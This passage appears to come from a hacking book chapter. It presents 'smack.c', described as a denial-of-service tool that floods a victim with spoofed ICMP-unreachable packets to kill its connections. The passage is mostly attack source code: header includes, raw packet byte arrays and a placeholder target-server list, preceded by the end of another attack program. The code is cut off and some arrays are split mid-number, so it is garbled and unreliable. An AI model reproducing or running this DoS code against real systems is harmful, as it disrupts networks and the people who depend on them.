```
if (icmp_unreach(argv[1],argv[2],atoi(argv[3]),type) <0) exit(1)
};
exit(0);
}
```

# Denial-of-Service Attack

**Synopsis**: As explained earlier in this chapter, `smack.c` is a DoS attack that sends random ICMP-unreachable packets from customized random IP addresses.

**Vulnerabilities**: All.

**Breach**: This DoS attack was designed as a connection-killer because the victim receives an abundance of packets from the addresses inserted between the */ Insert and End sections.

**smack.c**

```
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/uio.h>
#include <unistd.h>
char conn_pack0[] = { -128,0,0,12,1,81,85,65,75,69,0,3 };
char conn_pack1[] = { -1,-1,-1,-
1,99,111,110,110,101,99,116,32,34,92,110,111,
97,105,109,92,48,92,109,115,103,92,49,92,114
,97,116,1
101,92,50,53,48,48,92,98,111,116,116,109
,99,111,1
08,111,114,92,110,111,111,112,112,114,92,111,92,97,98,92,116,111,111,112,
92,110,97,109,101,92,83,110,111,111,112,121,34,10 };
#define PS0 20+8+12
#define PS1 20+8+strlen(conn_pack1)
char *servers[] = {
*/ Insert addresses here
"xxx.xxx.xxx.xxx:26000:0",
"xxx.xxx.xxx.xxx:26000:0",
"xxx.xxx.xxx.xxx:26000:0",
End */
```